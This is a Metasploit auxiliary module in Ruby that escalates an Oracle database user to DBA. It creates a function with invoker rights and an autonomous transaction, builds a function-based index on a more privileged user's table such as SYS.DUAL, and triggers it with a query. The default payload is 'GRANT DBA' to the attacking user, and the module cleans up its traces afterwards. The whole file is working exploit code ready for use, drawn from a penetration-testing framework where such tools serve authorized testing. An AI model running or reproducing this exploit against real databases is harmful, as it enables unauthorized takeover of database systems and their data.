##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::ORACLE

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Oracle DB Privilege Escalation via Function-Based Index',
      'Description'    => %q{
        This module will escalate an Oracle DB user to DBA by creating a
        function-based index on a table owned by a more-privileged user.
        Credits to David Litchfield for publishing the technique.
      },
      'Author'         =>
        [
          'David Litchfield', # Vulnerability discovery and exploit
          'Moshe Kaplan',     # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.davidlitchfield.com/Privilege_Escalation_via_Oracle_Indexes.pdf' ],
        ],
      'DisclosureDate' => 'Jan 21 2015'))

    register_options(
      [
        OptString.new('SQL', [ true, 'SQL to execute.', "GRANT DBA to #{datastore['DBUSER']}" ]),
        OptString.new('TABLE', [ true, 'Table to create the index on.', 'SYS.DUAL' ]),
      ])
  end

  def run
    return unless check_dependencies

    func_name = Rex::Text.rand_text_alpha(6..10)

    create_function = <<-EOF
      CREATE OR REPLACE FUNCTION #{func_name}
      (FOO varchar) return varchar
      deterministic authid current_user is
      pragma autonomous_transaction;
      begin
      execute immediate '#{datastore['SQL'].gsub("'", "\\\\'")}';
      commit;
      return '';
      end;
    EOF

    index_name = Rex::Text.rand_text_alpha(6..10)
    param_value = Rex::Text.rand_text_alpha(2..6)

    create_index = "CREATE INDEX #{index_name} ON " \
      "#{datastore['TABLE']}(#{datastore['DBUSER']}.#{func_name}('#{param_value}'))"

    trigger = "SELECT * FROM #{datastore['TABLE']}"

    clean_index = "drop index #{index_name}"
    clean_func = "drop function #{func_name}"

    print_status('Running exploit...')

    begin
      print_status("Attempting to create function #{func_name}...")
      prepare_exec(create_function)
      print_status("Attempting to create index #{index_name}...")
      prepare_exec(create_index)
      print_status('Querying to trigger function...')
      prepare_exec(trigger)
      print_status('Cleaning up index...')
      prepare_exec(clean_index)
      print_status('Cleaning up function...')
      prepare_exec(clean_func)
      print_status('Exploit complete!')
    rescue ::OCIError => e
      print_error("Error! #{e.message}")
    end
  end

  def prepare_exec(query)
    print_status(query)
    super
  end

end
